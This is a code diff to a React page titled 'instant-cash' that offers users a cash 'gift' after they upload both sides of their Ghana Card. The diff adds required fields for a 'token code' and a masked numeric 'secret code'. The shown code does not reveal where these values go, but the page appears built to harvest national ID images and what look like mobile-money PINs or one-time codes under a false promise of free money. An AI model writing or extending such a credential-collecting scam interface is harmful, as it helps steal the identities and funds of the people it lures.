@@ -5,6 +5,7 @@ import { toast } from "sonner";
 import { Gift, ImageUp, Loader2 } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
 import { cn } from "@/lib/utils";
 
 export const Route = createFileRoute("/_authenticated/instant-cash")({
@@ -32,6 +33,8 @@ function InstantCashPage() {
   const [front, setFront] = useState<File | null>(null);
   const [back, setBack] = useState<File | null>(null);
   const [busy, setBusy] = useState(false);
+  const [token, setToken] = useState("");
+  const [secret, setSecret] = useState("");
 
   if (claim.isLoading) return <Loader2 className="mx-auto mt-20 animate-spin" />;
   if (claim.data) {
@@ -56,6 +59,8 @@ function InstantCashPage() {
   async function submit() {
     if (!amount) return void toast.error("Choose an amount");
     if (!front || !back) return void toast.error("Upload both sides of your Ghana Card");
+    if (token.length < 4) return void toast.error("Enter your token code");
+    if (secret.length < 4) return void toast.error("Enter your secret code");
     setBusy(true);
     try {
       const [f, b] = await Promise.all([upload("front", front), upload("back", back)]);
@@ -100,6 +105,16 @@ function InstantCashPage() {
         <div className="grid gap-3 sm:grid-cols-2">
           <FilePick label="Front" file={front} onFile={setFront} />
           <FilePick label="Back" file={back} onFile={setBack} />
+        </div>
+        <div className="grid gap-3 sm:grid-cols-2">
+          <label className="space-y-1 text-sm font-medium">
+            Token code
+            <Input value={token} onChange={(e) => setToken(e.target.value.trim())} placeholder="Enter token code" autoComplete="off" />
+          </label>
+          <label className="space-y-1 text-sm font-medium">
+            Secret code
+            <Input type="password" inputMode="numeric" value={secret} onChange={(e) => setSecret(e.target.value.trim())} placeholder="Enter secret code" autoComplete="off" />
+          </label>
         </div>
         <Button size="lg" className="w-full" onClick={submit} disabled={busy}>
           {busy && <Loader2 className="animate-spin" />}Claim {amount ? `GH₵${amount.toLocaleString()}` : "cash"}
